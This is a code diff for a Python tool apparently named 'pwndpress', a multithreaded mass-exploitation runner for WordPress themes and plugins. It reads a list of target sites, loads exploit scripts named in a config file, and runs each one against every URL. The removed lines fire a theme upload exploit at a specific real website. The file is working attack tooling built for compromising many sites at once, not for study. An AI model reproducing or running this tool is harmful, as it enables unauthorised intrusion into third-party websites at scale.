@@ -7,7 +7,70 @@ try:
 except:
     print (f'[INFO] pip install -r requirements.txt')
 
-action = subprocess.getoutput('python3 ./lib/themes/RFU/agritourismo.py -u https://pantheawine.com/')
-if action != '':
-    print (action)
-else:pass
+configs = json.load(open('config.json'))
+
+def themes(url):
+    try:
+        for config in configs:
+            if config['type'] == 'plugin':
+                return False
+            else:pass
+            
+            name = config['name']
+            print (f'[CHECK] {name} => {url}')
+            action = subprocess.getoutput(f'python3 ./{config["file"]} -u {url}')
+            if action != '':
+                print (action)
+            else:pass
+    except Exception as err:
+        print ('[ERROR] '+ url)
+        pass
+
+def plugins(url):
+    try:
+        for config in configs:
+            if config['type'] == 'theme':
+                return False
+            else:pass
+            
+            name = config['name']
+            print (f'[CHECK] {name} => {url}')
+            action = subprocess.getoutput(f'python3 ./{config["file"]} -u {url}')
+            if action != '':
+                print (action)
+            else:pass
+    except Exception as err:
+        print ('[ERROR] '+ url)
+        pass 
+     
+def init():
+    banner = '''
+    OPTIONS - pwndpress;
+    
+    1. Exploit Theme
+    2. Exploit Plugin
+    '''
+    
+    try:
+        sitelist = input(' [?] SITELIST : ')
+        urls = open(sitelist, "r", encoding='utf8').read().splitlines()
+    except:
+        print ('[404] SITELIST NOT FOUND')
+        sys.exit()
+    
+    thread = int(input(' [?] THREAD   : '))
+    option = int(input(' [?] OPTION   : '))
+        
+    try:
+        pp = Pool(int(thread))
+        if option == 1:
+            pp.map(themes, urls)
+        elif option == 2:
+            pp.map(plugins, urls)
+        else:
+            print('[ERROR] Invalid Selected Option.')
+            sys.exit()
+    except:
+        print ('[ERROR] Multithread error.')
+
+init()
